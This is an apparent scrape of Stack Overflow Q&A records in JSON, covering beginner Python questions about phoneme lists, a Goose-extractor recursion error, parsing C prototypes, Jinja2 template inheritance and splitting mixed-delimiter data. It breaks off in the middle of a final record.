[{"tags": ["python", "python-3.x"], "comments": [{"owner": {"reputation": 12710, "user_id": 2653390, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/ArNxx.jpg?s=128&g=1", "display_name": "Shashank", "link": "https://stackoverflow.com/users/2653390/shashank"}, "edited": false, "score": 0, "creation_date": 1427933305, "post_id": 29402908, "comment_id": 46981274, "body": "What is <code>pattern</code>? You are not checking anywhere if the last character is a 0, 1, or 2."}], "answers": [{"comments": [{"owner": {"reputation": 6875, "user_id": 2002452, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/3c2349a8ccc58b9d485eff0095025ae5?s=128&d=identicon&r=PG", "display_name": "michaelmeyer", "link": "https://stackoverflow.com/users/2002452/michaelmeyer"}, "edited": false, "score": 0, "creation_date": 1427933512, "post_id": 29402994, "comment_id": 46981329, "body": "<code>A vowel phoneme is a phoneme whose last character is 0, 1, or 2.</code>"}, {"owner": {"reputation": 12710, "user_id": 2653390, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/ArNxx.jpg?s=128&g=1", "display_name": "Shashank", "link": "https://stackoverflow.com/users/2653390/shashank"}, "edited": false, "score": 0, "creation_date": 1427933593, "post_id": 29402994, "comment_id": 46981359, "body": "It should be <code>if phoneme[-1] in &#39;012&#39;:</code>"}], "tags": [], "owner": {"reputation": 14751, "user_id": 176569, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/edfaee6d982f519a6efdad5b2b6c12d0?s=128&d=identicon&r=PG", "display_name": "bpgergo", "link": "https://stackoverflow.com/users/176569/bpgergo"}, "is_accepted": false, "score": 4, "last_activity_date": 1427933850, "last_edit_date": 1427933850, "creation_date": 1427933327, "answer_id": 29402994, "question_id": 29402908, "link": "https://stackoverflow.com/questions/29402908/return-a-list-that-contains-the-last-vowel-phoneme-and-subsequent-consonant-phon/29402994#29402994", "title": "return a list that contains the last vowel phoneme and subsequent consonant phoneme(s)", "body": "<pre><code>def last_phonemes(phoneme_list):\n    \"\"\" (list of str) -&gt; list of str\n\n    Return the last vowel phoneme and subsequent consonant phoneme(s) in\n    phoneme_list.\n\n    &gt;&gt;&gt; last_phonemes(['AE1', 'B', 'S', 'IH0', 'N', 'TH'])\n    ['IH0', 'N', 'TH']\n    &gt;&gt;&gt; last_phonemes(['IH0', 'N'])\n    ['IH0', 'N']\n    &gt;&gt;&gt; last_phonemes(['B', 'S'])\n    []\n    \"\"\"\n    for i, phoneme in reversed(list(enumerate(phoneme_list))):\n        if phoneme[-1] in '012':\n            return phoneme_list[i:]\n    return []\n</code></pre>\n\n<p><strong>EDIT</strong> explanation</p>\n\n<p>You want to iterate over the phoneme_list in <a href=\"https://docs.python.org/2/library/functions.html#reversed\" rel=\"nofollow\">reversed</a> order. When you find the first item that contains the '0' character, then you want to slice the original list (you got the slice part right in your code). You will need the index to make the slicing, so you <a href=\"https://docs.python.org/2/library/functions.html#enumerate\" rel=\"nofollow\">enumerate</a> the phoneme_list before reversing. </p>\n"}], "owner": {"reputation": 99, "user_id": 4208574, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/5ff31dc20cac86821f7ce90c96be8980?s=128&d=identicon&r=PG&f=1", "display_name": "JerryMichaels", "link": "https://stackoverflow.com/users/4208574/jerrymichaels"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 461, "favorite_count": 0, "answer_count": 1, "score": -6, "last_activity_date": 1427933850, "creation_date": 1427932719, "last_edit_date": 1427933516, "question_id": 29402908, "link": "https://stackoverflow.com/questions/29402908/return-a-list-that-contains-the-last-vowel-phoneme-and-subsequent-consonant-phon", "title": "return a list that contains the last vowel phoneme and subsequent consonant phoneme(s)", "body": "<p>So i was working on this question</p>\n\n<p>A vowel phoneme is a phoneme whose last character is 0, 1, or 2. As examples, the word BEFORE (B IH0 F AO1 R) contains two vowel phonemes and the word GAP (G AE1 P) has one. </p>\n\n<p>The parameter represents a list of phonemes. The function is to return a list that contains the last vowel phoneme and subsequent consonant phoneme(s) in the given list of phonemes. The empty list is to be returned if the list of phonemes does not contain a vowel phoneme.</p>\n"}, {"tags": ["python", "extractor", "goose"], "comments": [{"owner": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "edited": false, "score": 0, "creation_date": 1427933072, "post_id": 29402905, "comment_id": 46981218, "body": "It doesn&#39;t fix whatever&#39;s wrong with the code, but you can set python&#39;s max recursion depth with <code>import sys; sys.setrecursionlimit()</code> - I think the default is 5000, and you can up it until you run out of memory or something else goes wrong."}, {"owner": {"reputation": 75, "user_id": 2399922, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/PBlmg.jpg?s=128&g=1", "display_name": "papabomay", "link": "https://stackoverflow.com/users/2399922/papabomay"}, "reply_to_user": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "edited": false, "score": 0, "creation_date": 1427933280, "post_id": 29402905, "comment_id": 46981265, "body": "Sorry, with your suggestions my Mac crash!"}, {"owner": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "edited": false, "score": 0, "creation_date": 1427933932, "post_id": 29402905, "comment_id": 46981457, "body": "@papabombay is there no stack trace?"}, {"owner": {"reputation": 75, "user_id": 2399922, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/PBlmg.jpg?s=128&g=1", "display_name": "papabomay", "link": "https://stackoverflow.com/users/2399922/papabomay"}, "reply_to_user": {"reputation": 2777, "user_id": 1002371, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/612ee2165cc4115ea14888dbf6ae24cf?s=128&d=identicon&r=PG", "display_name": "a p", "link": "https://stackoverflow.com/users/1002371/a-p"}, "edited": false, "score": 0, "creation_date": 1427934658, "post_id": 29402905, "comment_id": 46981641, "body": "Yes but too extense ! anyway the author of goose - extractor who speaks French and my better tell me it&#39;s a problem of lxml library , but I still get consistent solution of the problem"}], "answers": [{"comments": [{"owner": {"reputation": 75, "user_id": 2399922, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/PBlmg.jpg?s=128&g=1", "display_name": "papabomay", "link": "https://stackoverflow.com/users/2399922/papabomay"}, "edited": false, "score": 0, "creation_date": 1427933880, "post_id": 29403012, "comment_id": 46981445, "body": "Ok agree and that details need ?"}], "tags": [], "owner": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "is_accepted": false, "score": 0, "last_activity_date": 1427933497, "creation_date": 1427933497, "answer_id": 29403012, "question_id": 29402905, "link": "https://stackoverflow.com/questions/29402905/how-can-resolve-recursion-depth-exceeded-goose-extractor/29403012#29403012", "title": "How can resolve recursion depth exceeded (Goose-extractor)", "body": "<p>As mentioned in the comments, you can increase the recursion limit with <code>sys.setrecursionlimit()</code> (<a href=\"https://docs.python.org/2/library/sys.html#sys.setrecursionlimit\" rel=\"nofollow\">2</a>/<a href=\"https://docs.python.org/3/library/sys.html#sys.setrecursionlimit\" rel=\"nofollow\">3</a>):</p>\n\n<pre><code>import sys\nsys.setrecursionlimit(10**5)\n</code></pre>\n\n<p>You can check what the default limit is with <code>sys.getrecursionlimit()</code> (<a href=\"https://docs.python.org/2/library/sys.html#sys.getrecursionlimit\" rel=\"nofollow\">2</a>/<a href=\"https://docs.python.org/3/library/sys.html#sys.getrecursionlimit\" rel=\"nofollow\">3</a>).</p>\n\n<p>Of course, this won't fix whatever's causing this recursion (there's no way to know what's wrong without more details), and might crash your computer if you don't fix that.</p>\n"}], "owner": {"reputation": 75, "user_id": 2399922, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/PBlmg.jpg?s=128&g=1", "display_name": "papabomay", "link": "https://stackoverflow.com/users/2399922/papabomay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 184, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1427933497, "creation_date": 1427932703, "question_id": 29402905, "link": "https://stackoverflow.com/questions/29402905/how-can-resolve-recursion-depth-exceeded-goose-extractor", "title": "How can resolve recursion depth exceeded (Goose-extractor)", "body": "<p>I am one problem with goose-extractor\nThis is my code:</p>\n\n<pre><code>  for resultado in soup.find_all('a', href=True,text=re.compile(llave)):\n        url = resultado['href']\n        article = g.extract(url=url)\n        print article.title\n</code></pre>\n\n<p>and take a look at my problem. </p>\n\n<pre><code>RuntimeError: maximum recursion depth exceeded\n</code></pre>\n\n<p>any suggestions ?</p>\n\n<p>I am a lousy programmer or hidden errors are not visible in python</p>\n"}, {"tags": ["python", "c", "parsing"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 2, "creation_date": 1427932735, "post_id": 29402901, "comment_id": 46981139, "body": "&quot;Efficiently&quot;? Well, just take your inefficient solution and clean it up."}, {"owner": {"reputation": 12433, "user_id": 1609077, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/0xiaN.png?s=128&g=1", "display_name": "scls", "link": "https://stackoverflow.com/users/1609077/scls"}, "edited": false, "score": 0, "creation_date": 1462736780, "post_id": 29402901, "comment_id": 61750271, "body": "<code>In [1]: proto=&quot;uint32_t foo(char a, int b, double* c, uint64_t d);&quot; In [2]: p = re.compile(&quot;(\\w+)\\s+(\\w+)\\s*\\(\\s*(.*)\\)&quot;)  # thanks to https:&#47;&#47;regex101.com&#47; In [3]: m = p.match(proto) In [4]: m.groups() Out[4]: (&#39;uint32_t&#39;, &#39;foo&#39;, &#39;char a, int b, double* c, uint64_t d&#39;) In [5]: list(map(lambda s: s.strip().split(&#39; &#39;)[0], m.group(3).split(&#39;,&#39;))) Out[5]: [&#39;char&#39;, &#39;int&#39;, &#39;double*&#39;, &#39;uint64_t&#39;]</code>"}], "answers": [{"tags": [], "owner": {"reputation": 1987, "user_id": 2317533, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/11f84de1d659deef11d4f2a75da58c76?s=128&d=identicon&r=PG", "display_name": "Fred Mitchell", "link": "https://stackoverflow.com/users/2317533/fred-mitchell"}, "is_accepted": false, "score": 2, "last_activity_date": 1427936237, "creation_date": 1427936237, "answer_id": 29403358, "question_id": 29402901, "link": "https://stackoverflow.com/questions/29402901/parsing-a-c-function-in-python/29403358#29403358", "title": "Parsing a C function in Python", "body": "<p>I think what you want is to parse the \"prototype of a C function\". When you say parse a \"C function\" ordinarily one would assume that you are doing what a compiler might do with the source implementation.</p>\n\n<p>In your example, you only show a prototype. In the real world, you will encounter many complications that might make you choose another approach. Your killer is the C preprocessor. In an insane piece of code the real type of 'a' could actually be double* due to a really bad macro. You also might have pointers to structs, typedefs for function pointers, etc.</p>\n\n<p>There is a complication that absolutely defies a solution to your problem. The compilation of the prototype will depend on command line arguments to a C compiler describing where to find header files. Without that metadata, you are hosed. With it, you would really want to run the C preprocessor first - check your compiler documentation for how to do so. Then your python program could read the output.</p>\n\n<p>That line might not even be in it - LOL - if it happened to be surrounded by a #if construct that eliminated it.</p>\n\n<p>These <em>features</em> of the C language are the features that make it really nasty to do things like write programs that operate on C, such as a refactoring engine.</p>\n"}], "owner": {"reputation": 41, "user_id": 4740398, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1e4dc463f5d0c98c3c8d80d511fb04f0?s=128&d=identicon&r=PG&f=1", "display_name": "Leon He", "link": "https://stackoverflow.com/users/4740398/leon-he"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 307, "favorite_count": 0, "closed_date": 1427953958, "answer_count": 1, "score": 2, "last_activity_date": 1427936237, "creation_date": 1427932672, "last_edit_date": 1427933101, "question_id": 29402901, "link": "https://stackoverflow.com/questions/29402901/parsing-a-c-function-in-python", "closed_reason": "Needs more focus", "title": "Parsing a C function in Python", "body": "<p>Say I want to parse a C function in a Python script and want to get a list with all the types of the arguments and only the arguments for the C function. How would I go about doing this efficiently?</p>\n\n<p>E.g.: \nWith this function</p>\n\n<pre><code>uint32_t foo(char a, int b, double* c, uint64_t d);\n</code></pre>\n\n<p>I want output <code>['char', 'int', 'double*', 'uint64_t']</code></p>\n"}, {"tags": ["python", "html", "jinja2"], "answers": [{"comments": [{"owner": {"reputation": 3003, "user_id": 2073738, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mHxGk.png?s=128&g=1", "display_name": "Suit Boy Apps", "link": "https://stackoverflow.com/users/2073738/suit-boy-apps"}, "edited": false, "score": 0, "creation_date": 1427933338, "post_id": 29402949, "comment_id": 46981282, "body": "Now my html that was defined is not working it is just like an image but not an image"}, {"owner": {"reputation": 4294, "user_id": 259645, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/OObkU.jpg?s=128&g=1", "display_name": "Aurora", "link": "https://stackoverflow.com/users/259645/aurora"}, "reply_to_user": {"reputation": 3003, "user_id": 2073738, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mHxGk.png?s=128&g=1", "display_name": "Suit Boy Apps", "link": "https://stackoverflow.com/users/2073738/suit-boy-apps"}, "edited": false, "score": 0, "creation_date": 1427933591, "post_id": 29402949, "comment_id": 46981357, "body": "I&#39;m sorry, your comment doesn&#39;t make sense to me. &quot;Just like an image but not an image&quot;? Is this now a different question?"}, {"owner": {"reputation": 3003, "user_id": 2073738, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mHxGk.png?s=128&g=1", "display_name": "Suit Boy Apps", "link": "https://stackoverflow.com/users/2073738/suit-boy-apps"}, "edited": false, "score": 0, "creation_date": 1427933725, "post_id": 29402949, "comment_id": 46981404, "body": "No it is the same question but after updating the code my form now no longer acts as a form but instead as similar to an image as in it is not interactive. The HTML I am talking about is under the <b>child template</b>"}, {"owner": {"reputation": 4294, "user_id": 259645, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/OObkU.jpg?s=128&g=1", "display_name": "Aurora", "link": "https://stackoverflow.com/users/259645/aurora"}, "reply_to_user": {"reputation": 3003, "user_id": 2073738, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mHxGk.png?s=128&g=1", "display_name": "Suit Boy Apps", "link": "https://stackoverflow.com/users/2073738/suit-boy-apps"}, "edited": false, "score": 0, "creation_date": 1427933939, "post_id": 29402949, "comment_id": 46981461, "body": "I suppose what I&#39;m asking is, does the html for the parent show up? Did my answer help you? In that case, then that problem has been fixed, and the form not working is possibly a new issue which might require a new question."}, {"owner": {"reputation": 3003, "user_id": 2073738, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mHxGk.png?s=128&g=1", "display_name": "Suit Boy Apps", "link": "https://stackoverflow.com/users/2073738/suit-boy-apps"}, "edited": false, "score": 0, "creation_date": 1427934012, "post_id": 29402949, "comment_id": 46981481, "body": "Yes it displays correctly just does not function correctly"}], "tags": [], "owner": {"reputation": 4294, "user_id": 259645, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/OObkU.jpg?s=128&g=1", "display_name": "Aurora", "link": "https://stackoverflow.com/users/259645/aurora"}, "is_accepted": true, "score": 3, "last_activity_date": 1427933390, "last_edit_date": 1427933390, "creation_date": 1427933046, "answer_id": 29402949, "question_id": 29402876, "link": "https://stackoverflow.com/questions/29402876/how-to-create-a-header-that-can-be-added-into-files-flask/29402949#29402949", "title": "How to create a header that can be added into files flask", "body": "<p>What you need to do is remove from your child template the lines <code>{% block head %}{% endblock %}</code></p>\n\n<p>Because in your child template you call <code>{% extends \"Header.html\" %}</code>, all of the content declared in Header.html (no matter what blocks it is in) will automatically be included. That's the job of extends.</p>\n\n<p>By adding the <code>{% block head %}{% endblock %}</code> in your child template, what you have effectively said is \"take everything from Header.html, but override everything in the 'head' block with what I specify in my child template\". Then, because there is nothing in the block defined in your child template, you are replacing the content defined in your Header.html file with nothing.</p>\n\n<p>You want to use the <code>{% block blockname %}</code> notation to specify what you want to change in the child template, not what you want to keep the same.</p>\n\n<p><a href=\"http://jinja.pocoo.org/docs/dev/templates/#template-inheritance\" rel=\"nofollow\">This page on inheritence</a> is the relevant section of the Jinja documentation, and provides a nice example.</p>\n"}], "owner": {"reputation": 3003, "user_id": 2073738, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/mHxGk.png?s=128&g=1", "display_name": "Suit Boy Apps", "link": "https://stackoverflow.com/users/2073738/suit-boy-apps"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 26, "favorite_count": 0, "accepted_answer_id": 29402949, "answer_count": 1, "score": 0, "last_activity_date": 1427933390, "creation_date": 1427932514, "question_id": 29402876, "link": "https://stackoverflow.com/questions/29402876/how-to-create-a-header-that-can-be-added-into-files-flask", "title": "How to create a header that can be added into files flask", "body": "<p>I am wondering how to create a jinja2 template that would allow my to put my header into a variable where I can extend the base file and then call upon the header in my child file. </p>\n\n<p><strong>Currently my code for the parent is:</strong></p>\n\n<pre><code>{% block head %}\n&lt;div class=\"wrapper col2\"&gt;\n    &lt;div id=\"topbar\"&gt;\n    &lt;div id=\"topnav\"&gt;\n      &lt;ul&gt;\n\n          &lt;ul&gt;\n        &lt;li&gt;&lt;a href=\"/\"&gt;Home&lt;/a&gt;&lt;/li&gt;\n\n        &lt;li&gt;&lt;a href=\"sign-up\"&gt;Sign in/up&lt;/a&gt;&lt;/li&gt;\n        &lt;li&gt;&lt;a href=\"#\"&gt;Admin console&lt;/a&gt;\n          &lt;ul&gt;\n            &lt;li&gt;&lt;a href=\"/WelcomeAdmin/\"&gt;Console&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"staffman\"&gt;Staff Management&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"AlertConsole\"&gt;ALERTS&lt;/a&gt;&lt;/li&gt;\n            &lt;li&gt;&lt;a href=\"shootersign\"&gt;Sign up Shooters&lt;/a&gt;&lt;/li&gt;\n          &lt;/ul&gt;\n        &lt;/li&gt;\n\n        &lt;li &gt;&lt;a href=\"contact-us\"&gt;Contact Us&lt;/a&gt;&lt;/li&gt;\n          &lt;li class=\"last\"&gt;&lt;a href=\"/Logout\"&gt;logout&lt;/a&gt;&lt;/li&gt;\n      &lt;/ul&gt;\n    &lt;/div&gt;\n    &lt;br class=\"clear\" /&gt;\n  &lt;/div&gt;\n        &lt;hr&gt;\n    {% with messages = get_flashed_messages() %}\n      {% if messages %}\n        &lt;ul&gt;\n        {% for message in messages %}\n            &lt;li&gt;{{ message }} &lt;/li&gt;\n        {% endfor %}\n        &lt;/ul&gt;\n      {% endif %}\n    {% endwith %}\n\n&lt;/div&gt;\n{% endblock %}\n</code></pre>\n\n<p><strong>My child template is:</strong></p>\n\n<pre><code>{% extends \"Header.html\" %}\n{% block head %}\n{% endblock %}\n&lt;h1&gt;CREATE SHOOT&lt;/h1&gt;\n\n&lt;form action=\"\" method=\"post\" name=\"form\"&gt;\n      {{ form.hidden_tag() }}\n      &lt;p&gt;\n          &lt;h2&gt;Name of shoot:&lt;/h2&gt;\n          {{ form.nameofshoot(size=40) }}&lt;br&gt;\n    &lt;h2&gt;Number of days in shoot:&lt;/h2&gt;\n            {{ form.day}}\n      &lt;p&gt;&lt;input type=\"submit\" value=\"Create Shoot\"&gt;&lt;/p&gt;\n  &lt;/form&gt;\n</code></pre>\n\n<p>Am I doing something wrong or is there another approach I can take?</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "edited": false, "score": 0, "creation_date": 1427932855, "post_id": 29402867, "comment_id": 46981166, "body": "Use a regex split by either spaces or commas."}], "answers": [{"comments": [{"owner": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "edited": false, "score": 0, "creation_date": 1427933172, "post_id": 29402968, "comment_id": 46981241, "body": "Same time? Must have been thinking the same thing."}, {"owner": {"reputation": 159902, "user_id": 3297613, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/KHhzd.jpg?s=128&g=1", "display_name": "Avinash Raj", "link": "https://stackoverflow.com/users/3297613/avinash-raj"}, "reply_to_user": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "edited": false, "score": 0, "creation_date": 1427933228, "post_id": 29402968, "comment_id": 46981252, "body": "@MalikBrahimi not same time. Posted the answer after seeing your comment."}, {"owner": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "edited": false, "score": 0, "creation_date": 1427933506, "post_id": 29402968, "comment_id": 46981327, "body": "Our answer are actually a bit different. I used an regex or and you used a class (;"}, {"owner": {"reputation": 159902, "user_id": 3297613, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/KHhzd.jpg?s=128&g=1", "display_name": "Avinash Raj", "link": "https://stackoverflow.com/users/3297613/avinash-raj"}, "reply_to_user": {"reputation": 11, "user_id": 4740390, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pwV7vGqAbBI/AAAAAAAAAAI/AAAAAAAAe38/9xRBA4IQGhE/photo.jpg?sz=128", "display_name": "Priya Gupta", "link": "https://stackoverflow.com/users/4740390/priya-gupta"}, "edited": false, "score": 0, "creation_date": 1427933787, "post_id": 29402968, "comment_id": 46981420, "body": "@Priya Welcome to StackOverflow.Accept an answer which you love the most."}], "tags": [], "owner": {"reputation": 159902, "user_id": 3297613, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/KHhzd.jpg?s=128&g=1", "display_name": "Avinash Raj", "link": "https://stackoverflow.com/users/3297613/avinash-raj"}, "is_accepted": false, "score": 4, "last_activity_date": 1427933320, "last_edit_date": 1495541659, "creation_date": 1427933135, "answer_id": 29402968, "question_id": 29402867, "link": "https://stackoverflow.com/questions/29402867/reading-in-data-with-different-delimiters-in-python/29402968#29402968", "title": "Reading in data with different delimiters in Python", "body": "<p><a href=\"https://stackoverflow.com/questions/29402867/reading-in-data-with-different-delimiters-in-python/29402968#comment46981166_29402867\">As per the comment</a>, just split each line according to the  comma or a space through <code>re.split</code> function.</p>\n\n<pre><code>import re\nwith open('file') as f:\n    for line in f:\n        print(re.split(r'[,\\s]', line.strip()))\n</code></pre>\n\n<p><code>[,\\s]</code> character class which matches either a comma or a <code>\\s</code> space character.</p>\n\n<p><strong>Output:</strong></p>\n\n<pre><code>['0.32', '0.32', '0.12', '0.04', '0.07', '0.13']\n['3', '7']\n['32', '62', '42', '68', '12', '98']\n['95', '13', '97', '25', '93', '37', '79', '27', '75', '19', '49', '47', '67', '17']\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "is_accepted": true, "score": 1, "last_activity_date": 1427933137, "creation_date": 1427933137, "answer_id": 29402969, "question_id": 29402867, "link": "https://stackoverflow.com/questions/29402867/reading-in-data-with-different-delimiters-in-python/29402969#29402969", "title": "Reading in data with different delimiters in Python", "body": "<p>Use a regex split by either spaces or commas.   </p>\n\n<pre><code>with open('data.csv') as data:\n    lines = [re.split(r'\\s+|,', i.strip()) for i in data]\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1987, "user_id": 2317533, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/11f84de1d659deef11d4f2a75da58c76?s=128&d=identicon&r=PG", "display_name": "Fred Mitchell", "link": "https://stackoverflow.com/users/2317533/fred-mitchell"}, "is_accepted": false, "score": 0, "last_activity_date": 1427936837, "creation_date": 1427936837, "answer_id": 29403424, "question_id": 29402867, "link": "https://stackoverflow.com/questions/29402867/reading-in-data-with-different-delimiters-in-python/29403424#29403424", "title": "Reading in data with different delimiters in Python", "body": "<p>An alternative, if there is only one space between fields, would be to replace each space with a comma, or each comma with a space, then use split () as appropriate. If the restriction does not hold, you will need a regex that handles it appropriately.</p>\n\n<p>\"<em>Whenever you choose regex as a solution to your problem, you have two problems.</em>\"</p>\n"}, {"tags": [], "owner": {"reputation": 97835, "user_id": 355230, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/VjcbL.jpg?s=128&g=1", "display_name": "martineau", "link": "https://stackoverflow.com/users/355230/martineau"}, "is_accepted": false, "score": 0, "last_activity_date": 1427944020, "creation_date": 1427944020, "answer_id": 29404357, "question_id": 29402867, "link": "https://stackoverflow.com/questions/29402867/reading-in-data-with-different-delimiters-in-python/29404357#29404357", "title": "Reading in data with different delimiters in Python", "body": "<p>You didn't say precisely what format you wanted the sets of data points read in as, but if the data points together represent a \"value\", you could do something like this:</p>\n\n<pre><code>with open('sample_data.csv') as csvfile:\n    for line in (line.strip() for line in csvfile):\n        row = line.split(sep=None if ' ' in line else ',')\n        print(row)\n</code></pre>\n\n<p>The <code>str.split()</code> method accepts an optional keyword argument that tells it what delimiter string to split upon, however if it's not given or is given and set to <code>None</code>, it then considers consecutive whitespace the delimiters. The code above checks to see if each line has any space characters in it and passes the appropriate keyword argument value to <code>split()</code> depending on what kind of data appears to be in that line.</p>\n\n<p>Output:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>['0.32', '0.32', '0.12', '0.04', '0.07', '0.13']\n['3', '7']\n['32,62', '42,68', '12,98']\n['95,13', '97,25', '93,37', '79,27', '75,19', '49,47', '67,17']\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 4740390, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pwV7vGqAbBI/AAAAAAAAAAI/AAAAAAAAe38/9xRBA4IQGhE/photo.jpg?sz=128", "display_name": "Priya Gupta", "link": "https://stackoverflow.com/users/4740390/priya-gupta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 239, "favorite_count": 0, "accepted_answer_id": 29402969, "answer_count": 4, "score": -1, "last_activity_date": 1427944020, "creation_date": 1427932453, "last_edit_date": 1427933018, "question_id": 29402867, "link": "https://stackoverflow.com/questions/29402867/reading-in-data-with-different-delimiters-in-python", "title": "Reading in data with different delimiters in Python", "body": "<p>I am trying to read in the following data from a file using Python 2.7:\n3</p>\n\n<pre><code>0.32,0.32,0.12,0.04,0.07,0.13\n3,7\n32,62 42,68 12,98\n95,13 97,25 93,37 79,27 75,19 49,47 67,17\n</code></pre>\n\n<p>The values are mostly comma separated but in the second to last line sets of data points are space delimited. Any ideas on how I can read in this data from a csv file?</p>\n"}, {"tags": ["python"], "answers": [{"tags": [], "owner": {"reputation": 2643, "user_id": 2444293, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/12e2df5d1a7f43ca9123592dbf8f9f99?s=128&d=identicon&r=PG", "display_name": "VHarisop", "link": "https://stackoverflow.com/users/2444293/vharisop"}, "is_accepted": false, "score": 0, "last_activity_date": 1427932595, "creation_date": 1427932595, "answer_id": 29402890, "question_id": 29402853, "link": "https://stackoverflow.com/questions/29402853/how-to-access-a-locally-defined-list-python/29402890#29402890", "title": "how to access a locally defined list (Python)", "body": "<p>The obvious thing to do is to <code>return</code> the list you created. \nJust modify the return statement to</p>\n\n<pre><code> return integers\n</code></pre>\n\n<p>at the end of your <code>counter()</code> function.</p>\n\n<p>If you were using those in a class and wanted <code>integers</code> to be used many times or across different methods for some reason, you could also make it a data attribute like <code>self.integers</code> but this is not the case here.</p>\n"}, {"tags": [], "owner": {"reputation": 757655, "user_id": 95810, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/e8d5fe90f1fe2148bf130cccd4dc311c?s=128&d=identicon&r=PG", "display_name": "Alex Martelli", "link": "https://stackoverflow.com/users/95810/alex-martelli"}, "is_accepted": true, "score": 1, "last_activity_date": 1427932714, "creation_date": 1427932714, "answer_id": 29402906, 